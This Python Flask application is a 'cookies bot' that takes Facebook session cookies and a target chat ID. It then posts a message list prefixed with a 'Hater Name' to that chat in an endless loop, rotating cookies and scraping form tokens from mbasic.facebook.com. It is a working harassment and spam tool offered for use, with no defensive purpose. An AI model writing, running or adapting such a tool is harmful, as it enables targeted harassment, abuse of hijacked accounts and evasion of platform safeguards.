from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import re
from bs4 import BeautifulSoup

app = Flask(__name__)
app.debug = True

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://mbasic.facebook.com/'
}

stop_events = {}
threads = {}

# --- Cookie Login & Message Sending Logic ---
def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    
    # Cycle through cookies if multiple provided
    cookie_index = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            
            # Current Cookie use karo
            current_cookie = cookies_list[cookie_index % len(cookies_list)]
            
            try:
                # 1. Session banakar cookies set karo
                session = requests.Session()
                session.headers.update(headers)
                
                # Cookie string ko dict me convert karna
                cookie_dict = {}
                for cookie in current_cookie.split(';'):
                    if '=' in cookie:
                        key, value = cookie.split('=', 1)
                        cookie_dict[key.strip()] = value.strip()
                session.cookies.update(cookie_dict)

                # 2. Message Page kholo aur Form Data nikalo (fb_dtsg, action url)
                # Note: mbasic me thread URL format: /messages/read/?tid=cid.c.{id}
                msg_url = f'https://mbasic.facebook.com/messages/read/?tid=cid.c.{thread_id}'
                response = session.get(msg_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Form dhundo
                form = soup.find('form', action=lambda x: x and '/messages/send/' in x)
                
                if form:
                    action_url = 'https://mbasic.facebook.com' + form['action']
                    
                    # Hidden inputs (fb_dtsg, jazoest, etc.) nikalo
                    data = {}
                    for input_tag in form.find_all('input', type='hidden'):
                        data[input_tag.get('name')] = input_tag.get('value')
                    
                    # Apna message add karo
                    full_message = str(mn) + ' ' + message1
                    data['body'] = full_message
                    data['send'] = 'Send' # Button name usually

                    # 3. Message POST karo
                    post_response = session.post(action_url, data=data)
                    
                    if post_response.status_code == 200:
                         print(f"Message Sent: {full_message}")
                    else:
                         print(f"Failed to send. Status: {post_response.status_code}")
                else:
                    print("Error: Chat Form not found. Check Cookie or Thread ID.")
                    # Agar login fail hua to shayad cookie expire ho gyi
            
            except Exception as e:
                print(f"Error: {e}")

            # Next msg ke liye wait
            time.sleep(time_interval)
            
            # Next cookie par switch karo (optional logic)
            cookie_index += 1

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('tokenOption') # Name wahi rakha hai UI me but logic cookie hai

        if cookie_option == 'single':
            raw_cookie = request.form.get('singleToken')
            cookies_list = [raw_cookie]
        else:
            token_file = request.files['tokenFile']
            cookies_list = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id} (Cookies Mode)'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>😈COOKIES BOT HERE🐧</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* Same CSS as before just background slightly different to indicate update */
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
    * { font-family: 'Poppins', sans-serif; }
    body {
      background: linear-gradient(135deg, #000000 0%, #0f9b0f 50%, #000000 100%);
      background-size: 400% 400%;
      animation: gradient 15s ease infinite;
      color: white;
      min-height: 100vh;
      margin: 0; padding: 20px;
    }
    @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
    .container {
      max-width: 400px;
      background: rgba(0, 0, 0, 0.8);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 10px 25px rgba(0,255,0, 0.2);
      border: 1px solid rgba(0, 255, 0, 0.3);
      margin: 30px auto;
    }
    .form-control { background: rgba(255, 255, 255, 0.1); border: 1px solid #0f9b0f; color: white; }
    .form-control:focus { background: rgba(255, 255, 255, 0.2); color: white; box-shadow: 0 0 10px #0f9b0f; }
    .btn-submit { background: #0f9b0f; border: none; color: white; width: 100%; padding: 10px; border-radius: 10px; }
    h1 { text-align: center; color: #0f9b0f; text-shadow: 0 0 10px #0f9b0f; }
    label { color: #ccc; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>DEV3LOPED BY AXSHU</h1>
    </div>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Cookie Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Cookie</option>
          <option value="multiple">Cookie File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter FB Cookie (c_user=...; xs=...)</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Paste full cookie string here">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Cookie File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Thread ID (User ID)</label>
        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="1000123456789" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Name" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Time (Seconds)</label>
        <input type="number" class="form-control" id="time" name="time" placeholder="5" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Message File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-submit">Run via Cookies</button>
    </form>
    
    <br>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Task ID" required>
      </div>
      <button type="submit" class="btn btn-danger" style="width:100%;">Stop Task</button>
    </form>
  </div>

  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task {task_id} stopped.'
    else:
        return f'Task {task_id} not found.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

